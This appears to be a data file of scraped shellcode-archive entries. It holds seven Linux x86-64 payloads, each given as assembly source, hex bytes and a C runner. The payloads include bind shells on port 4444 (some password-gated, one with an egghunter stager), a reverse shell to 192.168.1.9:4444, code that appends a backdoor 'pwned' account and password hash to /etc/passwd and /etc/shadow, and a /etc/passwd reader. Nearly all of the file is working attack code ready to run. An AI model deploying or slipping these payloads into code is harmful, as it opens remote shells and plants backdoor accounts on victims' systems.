{"Title": "Linux/x64 - Bind (4444/TCP) + Stager + Egghunter (0x64616564) Shellcode (157 bytes)", "Author": "Christophe G", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-884.php", "View": null, "code": [";Exam Assignment 3", ";implementation of egghunter", ";Default egg = \"deaddead\"                       ;", ";If connected the stager check of egg , if present execute the code   ;", ";You can send a maximum of 255 bytes (egg + code)                     ;", ";if no egg , shellcode exit                                           ;", ";Christophe G SLAE64 - 1337                                           ;", "", "", "", "global _start", "", "     jmp short _start", "    _start_code :", "        call rsi", "", "_start:", "", "", "    ; sock = socket(AF_INET, SOCK_STREAM, 0)", "    ; AF_INET = 2", "    ; SOCK_STREAM = 1", "    ; syscall number 41", "", "    xor rdx , rdx", "    push rdx        ; null into the stack ", "    push byte 0x29 ; syscall number 41", "    pop rax", "    push byte 0x2  ; AF_INET", "    pop rdi", "    push byte 0x1  ; SOCK_STREAM", "    pop rsi", "    syscall", "", "    ; copy socket descriptor to rdi for future use", "    xchg rax , rdi", "", "", "    ; server.sin_family = AF_INET", "    ; server.sin_port = htons(PORT)", "    ; server.sin_addr.s_addr = INADDR_ANY", "    ; bzero(&server.sin_zero, 8)", "", "     xor rax, rax", "", "     push rax  ; bzero(&server.sin_zero, 8)", "", "", "     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)", "", "", "     not rbx", "     push rbx", "     push rsp  ; save rsp value into the stack , needed for rsi later", "", "", "    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)", "    ; syscall number 49", "", "", "    push byte 0x31 ; (49)", "    pop rax", "    pop rsi        ; retrieve value of rsp  pushed into the stack before", "    push byte 0x10  ; (16 bytes) sockaddr_len", "    pop rdx", "    syscall", "", "", "    ; listen(sock, MAX_CLIENTS)", "    ; syscall number 50", "", "    push byte 0x32 ; (50)", "    pop rax", "    push byte 0x2   ;MAX_CLIENTS", "", "    pop rsi", "    syscall", "", "", "    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)", "    ; syscall number 43", "", "", "    push byte 0x2b   ; Accept syscall", "    pop rax", "    sub rsp, 0x10", "    push rsp", "    pop rsi       ;(struct sockaddr *)&client", "", "    push byte 0x10", "    push rsp", "    pop rdx    ; &sockaddr_len", "", "    syscall", "", "    ; store the client socket description", "    mov r9, rax", "", "    ; close parent", "", "    push byte 0x3", "    pop rax", "    syscall", "", "", "", "", "", "      xchg rdi , r9   ; restore client socket description to rdi", "      xor rsi , rsi", "", "  dup2:", "      push byte 0x21", "      pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop", "      syscall", "    inc rsi", "    cmp rsi , 0x3  ; go in the next couple of instruction if equals", "", " loopne dup2", "", "       xor rsi , rsi", "       mul rsi", "       xor rdi , rdi", "       sub spl , 0xff", "       mov rsi , rsp", "       mov dl , 0xff", "       syscall", "", "      Inc_rsi:", "         cmp dil , 0xff", "         jz Exit", "         inc rsi", "         inc rdi", "", "", "", "      cmp [rsi - 4] , dword 0x64616564                   ; egghunter", "      jnz Inc_rsi", "      cmp [rsi - 8] , dword 0x64616564", "      jnz Inc_rsi", "      jz _start_code", "", "      Exit:", "         push byte 0x3c", "         pop rax", "         syscall", "", "", "", "", "------------------------------------------------------------------------------------------------------------------------------------------------", "", "Usage :", "", "    Execve Shellcode ", "", "#(echo -ne \"\\x68\\x85\\x11\\x47\\x02\\x64\\x65\\x61\\x64\\x64\\x65\\x61\\x64\\xeb\\x1d\\x48\\x31\\xc0\\x5f\\x88\\x67\\x07\\x48\\x89\\x7f\\x08\\x48\\x89\\x47\\x10\\x48\\x8d\\x77\\x08\\x48\\x8d\\x57\\x10\\x48\\x83\\xc0\\x3b\\x0f\\x05\\xe8\\xde\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\" ; cat) | nc localhost 4444", "", "", "\"x68\\x85\\x11\\x47\\x02\" -->> dumm bytes", "", "\"\\x64\\x65\\x61\\x64\\x64\\x65\\x61\\x64\" -->> egg (deaddead)", "", "\"\\xeb\\x1d\\x48\\x31\\xc0\\x5f\\x88\\x67\\x07\\x48\\x89\\x7f\\x08\\x48\\x89\\x47\\x10\"", "\"\\x48\\x8d\\x77\\x08\\x48\\x8d\\x57\\x10\\x48\\x83\\xc0\\x3b\\x0f\\x05\\xe8\\xde\\xff\"  -->> shellcode Execve JCP ", "\"\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x42\\x42\\x42\\x42\\x42\\x42\\x42\"", "\"\\x42\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\" ", "", "---------------------------------------------------------------------------------------------------------------------------------------------------", "", "", "Shellcode :", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char stager[] = \\", "\"\\xeb\\x02\\xff\\xd6\\x48\\x31\\xd2\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x48\\xc7\\xc3\\xfd\\xff\\xee\\xa3\\x48\\xf7\\xd3\\x53\\x54\\x6a\\x31\\x58\\x5e\\x6a\\x10\\x5a\\x0f\\x05\\x6a\\x32\\x58\\x6a\\x02\\x5e\\x0f\\x05\\x6a\\x2b\\x58\\x48\\x83\\xec\\x10\\x54\\x5e\\x6a\\x10\\x54\\x5a\\x0f\\x05\\x49\\x89\\xc1\\x6a\\x03\\x58\\x0f\\x05\\x49\\x87\\xf9\\x48\\x31\\xf6\\x6a\\x21\\x58\\x0f\\x05\\x48\\xff\\xc6\\x48\\x83\\xfe\\x03\\xe0\\xf2\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x31\\xff\\x40\\x80\\xec\\xff\\x48\\x89\\xe6\\xb2\\xff\\x0f\\x05\\x40\\x80\\xff\\xff\\x74\\x1e\\x48\\xff\\xc6\\x48\\xff\\xc7\\x81\\x7e\\xfc\\x64\\x65\\x61\\x64\\x75\\xeb\\x81\\x7e\\xf8\\x64\\x65\\x61\\x64\\x75\\xe2\\x0f\\x84\\x6a\\xff\\xff\\xff\\x6a\\x3c\\x58\\x0f\\x05\";", "", "int main()", "", "{", "", "    printf(\"Stager Length:  %d\\n\", (int)strlen(stager));", "", "", "    (*(void  (*)()) stager)();", "", "", "", "", "", "}"]},
{"Title": "Linux/x64 - Add User (pwned/$pass$) Using open,write,close To /etc/{passwd,shadow} Shellcode (358 bytes)", "Author": "Christophe G", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-880.php", "View": null, "code": ["; shellcode name add_user_password_JCP_open,write,close", "; Author    : Christophe G SLAE64-1337", "; Len       : 358 bytes", "; Language  : Nasm", "; \"name = pwned ; pass = $pass$\"", "; add user and password with open,write,close", "; tested kali linux , kernel 3.12", "", "", "global _start", "", "_start:", "", "       xor rax , rax", "       push rax", "       pop rsi", "       push rax                                       ; null all register used for open syscall", "       pop rdx", "       add al , 0x2", "       mov rdi , 0x647773ffffffffff", "       shr rdi , 0x28", "       push rdi                                       ; \"/etc/passwd\"", "       mov rdi , 0x7361702f6374652f", "       push rdi", "       mov rdi , rsp", "       mov si , 0x441", "       mov dx , 0x284", "       syscall                                        ; open syscall", "", "       xor edi , edi", "       add dil , 0x3", "", "jmp short findaddress                                   ; I placed the jmp short here size of code is too lenght for jmp short if placed in head ", "", "_respawn:", "", "       pop r9", "       mov  [r9 + 0x30] , byte 0xa                     ; terminate the string ", "       lea rsi , [r9]   ; \"pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash'    ", "       mov al , 0x1                                    ", "       xor rdx , rdx", "       add rdx , 0x31", "       syscall                                         ; write syscall", "", "       xor edi , edi", "       add dil , 0x3", "       push rdi                                  ", "pop rax", "       syscall                                         ; close syscall", "", "       xor rax , rax", "       push rax", "       pop rsi", "       add al , 0x2", "       mov rdi , 0x776f64ffffffffff                   ; open '/etc/shadow'", "       shr rdi , 0x28", "       push rdi", "       mov rdi , 0x6168732f6374652f", "       push rdi", "       mov rdi , rsp", "       mov si , 0x441", "       mov dx , 0x284", "       syscall                                       ; open syscall", "", "", "       xor rax , rax", "       add al , 0x1", "       xor edi , edi", "       add dil , 0x3", "       lea rsi , [r9 + 0x31]                      ;  \"pwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::\", 0xa", "       push rax", "       pop rdx", "       add dl , 0x83", "       syscall                                    ; write syscall ", "", "       xor edi , edi", "       add dil , 0x3", "       push rdi", "       pop rax", "       syscall", "", "", "", "", "       xor rax , rax", "       add al , 0x3c                             ;   exit (no matter value of exit code)", "       syscall", "", "", "     findaddress:", "        call _respawn", "        string : db \"pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bashApwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::\",0xa", "", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "\"\\x48\\x31\\xc0\\x50\\x5e\\x50\\x5a\\x04\\x02\\x48\\xbf\\xff\\xff\\xff\\xff\\xff\\x73\\x77\\x64\\x48\\xc1\\xef\\x28\\x57\\x48\\xbf\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x57\\x48\\x89\\xe7\\x66\\xbe\\x41\\x04\\x66\\xba\\x84\\x02\\x0f\\x05\\x31\\xff\\x40\\x80\\xc7\\x03\\xeb\\x74\\x41\\x59\\x41\\xc6\\x41\\x30\\x0a\\x49\\x8d\\x31\\xb0\\x01\\x48\\x31\\xd2\\x48\\x83\\xc2\\x31\\x0f\\x05\\x31\\xff\\x40\\x80\\xc7\\x03\\x57\\x58\\x0f\\x05\\x48\\x31\\xc0\\x50\\x5e\\x04\\x02\\x48\\xbf\\xff\\xff\\xff\\xff\\xff\\x64\\x6f\\x77\\x48\\xc1\\xef\\x28\\x57\\x48\\xbf\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x57\\x48\\x89\\xe7\\x66\\xbe\\x41\\x04\\x66\\xba\\x84\\x02\\x0f\\x05\\x48\\x31\\xc0\\x04\\x01\\x31\\xff\\x40\\x80\\xc7\\x03\\x49\\x8d\\x71\\x31\\x50\\x5a\\x80\\xc2\\x83\\x0f\\x05\\x31\\xff\\x40\\x80\\xc7\\x03\\x57\\x58\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\x87\\xff\\xff\\xff\\x70\\x77\\x6e\\x65\\x64\\x3a\\x78\\x3a\\x31\\x30\\x30\\x31\\x3a\\x31\\x30\\x30\\x32\\x3a\\x70\\x77\\x6e\\x65\\x64\\x2c\\x2c\\x2c\\x3a\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x70\\x77\\x6e\\x65\\x64\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x41\\x70\\x77\\x6e\\x65\\x64\\x3a\\x24\\x36\\x24\\x75\\x69\\x48\\x37\\x78\\x2e\\x76\\x68\\x69\\x76\\x44\\x37\\x4c\\x4c\\x58\\x59\\x24\\x37\\x73\\x4b\\x31\\x4c\\x31\\x4b\\x57\\x2e\\x43\\x68\\x71\\x57\\x51\\x5a\\x6f\\x77\\x33\\x65\\x73\\x76\\x70\\x62\\x57\\x56\\x58\\x79\\x52\\x36\\x4c\\x41\\x34\\x33\\x31\\x74\\x4f\\x4c\\x68\\x4d\\x6f\\x52\\x4b\\x6a\\x50\\x65\\x72\\x6b\\x47\\x62\\x78\\x52\\x51\\x78\\x64\\x49\\x4a\\x4f\\x32\\x49\\x61\\x6d\\x6f\\x79\\x6c\\x37\\x79\\x61\\x56\\x4b\\x55\\x56\\x6c\\x51\\x38\\x44\\x4d\\x6b\\x33\\x67\\x63\\x48\\x4c\\x4f\\x4f\\x66\\x2f\\x3a\\x31\\x36\\x32\\x36\\x31\\x3a\\x30\\x3a\\x39\\x39\\x39\\x39\\x39\\x3a\\x37\\x3a\\x3a\\x3a\\x0a\";", "", "", "", "int main()", "{", "    printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "    (*(void  (*)()) code)();", "}"]},
{"Title": "Linux/x64 - Add User (pwned/$pass$) Using echo cmd To /etc/{passwd,shadow} Shellcode (273 bytes)", "Author": "Christophe G", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-879.php", "View": null, "code": ["; shellcode name add_user_password", "; Author    : Christophe G SLAE64-1337", "; Len       : 273 bytes", "; Language  : Nasm", "; \"name = pwned ; pass = $pass$\"", "; add user and password with echo cmd", "; tested kali linux , kernel 3.12", "", "", "", "global _start", "", "_start:", "        jmp short findaddress", "                                                                 ", "_realstart:", "        pop rdi", "        xor byte [rdi + 7] , 0x41 ; replace A to null byte \"/bin/shA\"", "        xor byte [rdi + 10]  ,0x41 ; same \"-cA\"", "        xor rdx , rdx", "        lea rdi , [rdi]", "        lea r9 , [rdi + 8]", "        lea r10 , [rdi + 11]", "        push rdx", "        push r10", "        push r9", "        push rdi", "        mov rsi , rsp", "        add al , 59", "        syscall", "", "", "findaddress:", "        call _realstart", "        string : db \"/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\\$6\\$uiH7x.vhivD7LLXY\\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow\"", "", "unsigned char code[] = \\", "\"\\xeb\\x24\\x5f\\x80\\x77\\x07\\x41\\x80\\x77\\x0a\\x41\\x48\\x31\\xd2\\x48\\x8d\\x3f\\x4c\\x8d\\x4f\\x08\\x4c\\x8d\\x57\\x0b\\x52\\x41\\x52\\x41\\x51\\x57\\x48\\x89\\xe6\\x04\\x3b\\x0f\\x05\\xe8\\xd7\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x2d\\x63\\x41\\x65\\x63\\x68\\x6f\\x20\\x70\\x77\\x6e\\x65\\x64\\x3a\\x78\\x3a\\x31\\x30\\x30\\x31\\x3a\\x31\\x30\\x30\\x32\\x3a\\x70\\x77\\x6e\\x65\\x64\\x2c\\x2c\\x2c\\x3a\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x70\\x77\\x6e\\x65\\x64\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x20\\x3e\\x3e\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x20\\x3b\\x20\\x65\\x63\\x68\\x6f\\x20\\x70\\x77\\x6e\\x65\\x64\\x3a\\x5c\\x24\\x36\\x5c\\x24\\x75\\x69\\x48\\x37\\x78\\x2e\\x76\\x68\\x69\\x76\\x44\\x37\\x4c\\x4c\\x58\\x59\\x5c\\x24\\x37\\x73\\x4b\\x31\\x4c\\x31\\x4b\\x57\\x2e\\x43\\x68\\x71\\x57\\x51\\x5a\\x6f\\x77\\x33\\x65\\x73\\x76\\x70\\x62\\x57\\x56\\x58\\x79\\x52\\x36\\x4c\\x41\\x34\\x33\\x31\\x74\\x4f\\x4c\\x68\\x4d\\x6f\\x52\\x4b\\x6a\\x50\\x65\\x72\\x6b\\x47\\x62\\x78\\x52\\x51\\x78\\x64\\x49\\x4a\\x4f\\x32\\x49\\x61\\x6d\\x6f\\x79\\x6c\\x37\\x79\\x61\\x56\\x4b\\x55\\x56\\x6c\\x51\\x38\\x44\\x4d\\x6b\\x33\\x67\\x63\\x48\\x4c\\x4f\\x4f\\x66\\x2f\\x3a\\x31\\x36\\x32\\x36\\x31\\x3a\\x30\\x3a\\x39\\x39\\x39\\x39\\x39\\x3a\\x37\\x3a\\x3a\\x3a\\x20\\x3e\\x3e\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\"", ";", "", "int main()", "{", "    printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "    (*(void  (*)()) code)();", "}"]},
{"Title": "Linux/x64 - Read /etc/passwd Shellcode (82 bytes)", "Author": "Mr.Un1k0d3r", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-878.php", "View": null, "code": ["BITS 64", "; Author Mr.Un1k0d3r - RingZer0 Team", "; Read /etc/passwd Linux x86_64 Shellcode", "; Shellcode size 82 bytes", "global _start", "", "section .text", "", "_start:", "jmp _push_filename", "  ", "_readfile:", "; syscall open file", "pop rdi ; pop path value", "; NULL byte fix", "xor byte [rdi + 11], 0x41", "  ", "xor rax, rax", "add al, 2", "xor rsi, rsi ; set O_RDONLY flag", "syscall", "  ", "; syscall read file", "sub sp, 0xfff", "lea rsi, [rsp]", "mov rdi, rax", "xor rdx, rdx", "mov dx, 0xfff; size to read", "xor rax, rax", "syscall", "  ", "; syscall write to stdout", "xor rdi, rdi", "add dil, 1 ; set stdout fd = 1", "mov rdx, rax", "xor rax, rax", "add al, 1", "syscall", "  ", "; syscall exit", "xor rax, rax", "add al, 60", "syscall", "  ", "_push_filename:", "call _readfile", "path: db \"/etc/passwdA\"", "  ", "Shellcode:", "", "\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41"]},
{"Title": "Linux/x64 - Bind (4444/TCP) Shell (/bin/sh) + Password (Password) Shellcode (173 bytes)", "Author": "Christophe G", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-873.php", "View": null, "code": [";Bind_TCP 4444  with password                        ;", ";Default password = Password                         ;", ";If connected the shellcode no prompt for password   ;", ";Enter password directly and you get the bin/sh shell;", ";if password is wrong the shellcode exit:            ;", ";Christophe G SLAE64 - 1337 size 173 bytes           ;", "", "", "", "global _start", "", "", "", "_start:", "      ", "", "; sock = socket(AF_INET, SOCK_STREAM, 0)", "; AF_INET = 2", "; SOCK_STREAM = 1", "; syscall number 41 ", "", "push 0x29", "pop rax", "push 0x2", "pop rdi", "push 0x1", "pop rsi", "xchg rbx , rdx", "syscall", "", "; copy socket descriptor to rdi for future use ", "xchg rax , rdi", "", "", "; server.sin_family = AF_INET ", "; server.sin_port = htons(PORT)", "; server.sin_addr.s_addr = INADDR_ANY", "; bzero(&server.sin_zero, 8)", "", "xor rax, rax ", "", "mov dword [rsp - 4] , eax", "mov word [rsp - 6] ,0x5c11", "mov byte [rsp - 8] , 0x2", "sub rsp , 8", "", "", "; bind(sock, (struct sockaddr *)&server, sockaddr_len)", "; syscall number 49", "push 0x31", "pop rax", "mov rsi, rsp", "push 0x10", "pop rdx", "syscall", "", "", "; listen(sock, MAX_CLIENTS)", "; syscall number 50", "", "push 0x32", "pop rax", "push 0x2", "pop rsi ", "syscall", "", "", "; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)", "; syscall number 43", "", "", "push 0x2b", "pop rax", "sub rsp, 0x10", "mov rsi, rsp", "push 0x10", "mov rdx, rsp", "", "syscall", "", "; store the client socket description ", "mov r9, rax ", "", "; close parent", "push 0x3", "pop rax", "syscall", "", "", "", "", "", "xchg rdi , r9", "xor rsi , rsi", "", "dup2:", "    push 0x21", "    pop rax", "    syscall", "    inc rsi", "    cmp rsi , 0x2", "    loopne dup2", "", "CheckPass:", "    xor rax , rax", "    push 0x10", "    pop rdx", "    sub rsp , 16                 ; 16 bytes to receive user input ", "    mov rsi , rsp", "    xor edi , edi", "    syscall                      ; system read function call", "    mov rax , 0x64726f7773736150 ; \"Password\"", "    lea rdi , [rel rsi]", "    scasq", "    jz Execve", "    push 0x3c", "    pop rax", "    syscall", "", "", "", "", "", "Execve:", "    xor rax , rax", "    mov rdx , rax ", "    push rax", "", "    mov rbx, 0x68732f2f6e69622f", "    push rbx", "", "    ; store /bin//sh address in RDI", "    mov rdi, rsp", "", "    ; Second NULL push", "    push rax", "                ", "", "    ; Push address of /bin//sh", "    push rdi", "", "    ; set RSI", "    mov rsi, rsp", "", "    ; Call the Execve syscall", "    push 0x3b", "    pop rax", "    syscall"]},
{"Title": "Linux/x64 - Reverse (192.168.1.9:4444/TCP) Shell (/bin/sh) + Password (doomedra) Shellcode (138 bytes)", "Author": "Andriy Brukhovetskyy", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-871.php", "View": null, "code": ["/*", "; Author Andriy Brukhovetskyy - doomedraven - SLAEx64 1322", "; 138 bytes", "global _start", "section .text", "_start:", "", "   ;socket syscall", "   push byte 0x29 ; 41 socket ", "   pop rax    ", "   push byte 0x2 ; AF_INET", "   pop rdi  ", "   push byte 0x1 ; SOCK_STREAM", "   pop rsi    ", "   cdq ;rdx = 0 - ANY", "   syscall", "   ", "   xchg rdi, rax ; save socket descriptor", "   ", "   mov dword [rsp-4], 0x0901a8c0 ; ip", "   mov word [rsp-6], 0x5c11      ; port 4444", "   mov byte [rsp-8], 0x02", "   sub rsp, 8", "   ", "   push byte 0x2a ; connect", "   pop rax", "   mov rsi, rsp   ; pointer    ", "   push byte 0x10 ; len", "   pop rdx", "   syscall", "", "   push byte 0x3; counter ", "   pop rsi", "", "dup2_loop:", "   dec rsi", "   push byte 0x21", "   pop rax", "   syscall", "   jnz dup2_loop ; jump if not 0", "", "   ;read buffer", "   mov rdi, rax ; socket", "   ;xor rax, rax", "   cdq", "   mov byte [rsp-1], al ;0 read", "   sub rsp, 1", "         ", "   push rdx ", "   lea rsi, [rsp-0x10] ; 16 bytes from buf", "   add dl, 0x10        ; size_t count", "   syscall", "   ", "   ;test passcode", "   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')", "   push rdi                    ; save the socket", "   lea rdi, [rsi]              ; load string from address", "   scasq                       ; compare", "   jz accepted_passwd          ; jump if equal", "   ", "   ;exit if different :P", "   push byte 0x3c ", "   pop rax", "   syscall", "", "accepted_passwd:", "   ", "   ;execve", "   pop rdi; socket", "   xor rax, rax", "   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse", "   push rbx", "   mov rdi, rsp", "   push rax", "   mov rdx, rsp", "   push rdi ", "   mov rsi, rsp", "   add al, 0x3b", "   syscall", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "// 138 bytes ", "unsigned char code[] =\\", "\"\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x99\\x0f\\x05\"", "\"\\x48\\x97\\xc7\\x44\\x24\\xfc\"", "\"\\xc0\\xa8\\x01\\x09\\x66\\xc7\\x44\\x24\\xfa\"", "\"\\x11\\x5c\" //port big endiant", "\"\\xc6\\x44\\x24\\xf8\\x02\\x48\\x83\"", "\"\\xec\\x08\\x6a\\x2a\\x58\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x0f\"", "\"\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\"", "\"\\x75\\xf6\\x48\\x89\\xc7\\x99\\x88\\x44\\x24\\xff\\x48\\x83\"", "\"\\xec\\x01\\x52\\x48\\x8d\\x74\\x24\\xf0\\x80\\xc2\\x10\\x0f\"", "\"\\x05\\x48\\xb8\\x64\\x6f\\x6f\\x6d\\x65\\x64\\x72\\x61\\x57\"", "\"\\x48\\x8d\\x3e\\x48\\xaf\\x74\\x05\\x6a\\x3c\\x58\\x0f\\x05\"", "\"\\x5f\\x48\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\"", "\"\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\"", "\"\\x89\\xe6\\x04\\x3b\\x0f\\x05\";", "", "main()", "{", "   printf(\"Shellcode Length: %d\\n\", (int)strlen(code));", "   int (*ret)() = (int(*)())code;", "   ret();", "}"]},
{"Title": "Linux/x64 - Bind (4444/TCP) Shell (/bin/sh) + Password (doomedra) Shellcode (175 bytes)", "Author": "Andriy Brukhovetskyy", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-870.php", "View": null, "code": ["/*", ";Author - Andriy Brukhovetskyy - doomedraven - SLAEx64 - 1322", ";175 bytes", ";http://www.doomedraven.com/2014/05/slaex64-shellbindtcp-with-passcode.html", "", "global _start", "section .text", "_start:", "    push byte 0x29 ; 41 - socket syscall ", "    pop rax", "    push byte 0x02 ; AF_INET", "    pop rdi ", "    push byte 0x01 ; SOCK_STREAM", "    pop rsi", "    cdq", "    syscall", "    ", "    ;copy socket descriptor to rdi for future use", "    ;bind", "    xchg rdi, rax", "    xor rax, rax", "    mov dword [rsp-4], eax    ;INADDR_ANY", "    mov word  [rsp-6], 0x5c11 ;PORT 4444", "    mov byte  [rsp-8], 0x2    ;AF_INET", "    sub rsp, 0x8", "    ", "    push byte 0x31 ;49 bind", "    pop rax ", "    mov rsi, rsp", "    cdq", "    add dl, 16 ;len", "    syscall", "    ", "    ;listen", "    push byte 0x32 ;listen", "    pop rax", "    ;push byte 0x02 ;max clients", "    ;pop rsi", "    syscall", "     ", "    push byte 0x2b ; accept", "    pop rax", "    sub rsp, 0x10  ; adjust", "    xor rsi, rsi    ", "    mov rsi, rsp ; pointer", "    mov byte [rsp-1], 0x10 ;len", "    sub rsp, 0x01   ; adjust", "    cdq", "    mov rdx, rsp ; pointer", "    syscall", "        ", "    ;read buffer", "    mov rdi, rax ; socket", "    xor rax, rax", "    mov byte [rsp-1], al ;0 read", "    sub rsp, 1", "    cdq      ", "    push rdx ; 0 stdin", "    lea rsi, [rsp-0x10] ; 16 bytes from buffer", "    add dl, 0x10        ; len", "    syscall", "    ", "    ;test passcode", "    mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')", "    push rdi                    ; save the socket", "    lea rdi, [rsi]              ; load string from address", "    scasq                       ; compare", "    jz accepted_passwd          ; jump if equal", "    ", "    ;exit if different :P", "    xor rax, rax ", "    add al, 60", "    syscall", "", "accepted_passwd:", "", "    pop rdi; socket", "    push byte 0x03", "    pop rsi", "", "dup2_loop:", "    dec rsi", "    push byte 0x21", "    pop rax", "    syscall", "    jnz dup2_loop ; jump if not 0", "", "    push rsi; 0", "    ", "    ;execve", "    ;push /bin//sh in reverse", "    mov rbx, 0x68732f2f6e69622f", "    push rbx", "    ", "    mov rdi, rsp", "    push rsi", "    ", "    mov rdx, rsp", "    push rdi ", "    ", "    mov rsi, rsp", "    push byte 0x3b", "    pop rax", "    syscall", "    ", "*/", "        ", "#include <stdio.h>", "#include <string.h>", "", "// 175 bytes ", "unsigned char code[] =\\", "\"\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x99\\x0f\\x05\"", "\"\\x48\\x97\\x48\\x31\\xc0\\x89\\x44\\x24\\xfc\\x66\\xc7\\x44\"", "\"\\x24\\xfa\\x11\\x5c\\xc6\\x44\\x24\\xf8\\x02\\x48\\x83\\xec\"", "\"\\x08\\x6a\\x31\\x58\\x48\\x89\\xe6\\x99\\x80\\xc2\\x10\\x0f\"", "\"\\x05\\x6a\\x32\\x58\\x0f\\x05\\x6a\\x2b\\x58\\x48\\x83\\xec\"", "\"\\x10\\x48\\x31\\xf6\\x48\\x89\\xe6\\xc6\\x44\\x24\\xff\\x10\"", "\"\\x48\\x83\\xec\\x01\\x99\\x48\\x89\\xe2\\x0f\\x05\\x48\\x89\"", "\"\\xc7\\x48\\x31\\xc0\\x88\\x44\\x24\\xff\\x48\\x83\\xec\\x01\"", "\"\\x99\\x52\\x48\\x8d\\x74\\x24\\xf0\\x80\\xc2\\x10\\x0f\\x05\"", "\"\\x48\\xb8\\x64\\x6f\\x6f\\x6d\\x65\\x64\\x72\\x61\\x57\\x48\"", "\"\\x8d\\x3e\\x48\\xaf\\x74\\x07\\x48\\x31\\xc0\\x04\\x3c\\x0f\"", "\"\\x05\\x5f\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\"", "\"\\x05\\x75\\xf6\\x56\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\"", "\"\\x73\\x68\\x53\\x48\\x89\\xe7\\x56\\x48\\x89\\xe2\\x57\\x48\"", "\"\\x89\\xe6\\x6a\\x3b\\x58\\x0f\\x05\";", "", "main()", "{", "    printf(\"Shellcode Length: %d\\n\", (int)strlen(code));", "    int (*ret)() = (int(*)())code;", "    ret();", "}"]},
